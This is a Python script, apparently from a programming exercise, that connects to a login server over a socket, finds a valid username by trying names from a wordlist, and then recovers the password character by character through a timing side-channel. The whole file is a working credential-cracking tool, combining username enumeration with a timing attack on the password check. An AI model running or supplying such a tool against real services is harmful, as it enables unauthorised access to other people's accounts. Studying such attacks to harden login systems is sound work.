import sys
import socket
import itertools
import string
import json
import datetime


def login_request(client, login, password=' '):
        request = build_login_json(login, password).encode("utf8")
        client.send(request)
        response = json.loads(client.recv(2048).decode("utf8"))
        return response["result"]


def build_login_json(login, password):
    return json.dumps({
            "login": login,
            "password": password
        })


def get_password(max_length):
    for i in range(1, max_length):
        for combination in itertools.product(symbols, repeat=i):
            yield "".join(combination)


symbols = string.ascii_letters + string.digits
character_time = {}

args = sys.argv
if len(args) != 3:
    sys.exit("2 args required")

ip_address = args[1]
port = int(args[2])
correct_login = ""
password_buffer = ""
response = ""

with socket.socket() as client:
    try:
        client.connect((ip_address, port))
    except ConnectionAbortedError:
        print("Connection was aborted")
    else:
        with open("./hacking/logins.txt", 'r') as logins_file:
            for login_name in logins_file:
                login_name = login_name.rstrip()
                response = login_request(client, login_name)
                if response == "Wrong password!":
                    correct_login = login_name
                    break

        while response != "Connection success!":
            max_time = 0
            for password in get_password(2):
                reference_time = datetime.datetime.now()
                response = login_request(client, correct_login, password_buffer + password)
                if response == "Connection success!":
                    password_char = password
                    break
                time_difference = datetime.datetime.now().microsecond - reference_time.microsecond
                character_time[password] = time_difference
            else:
                password_char = max(character_time.keys(), key=(lambda k: character_time[k]))
            password_buffer += password_char


print(build_login_json(correct_login, password_buffer))
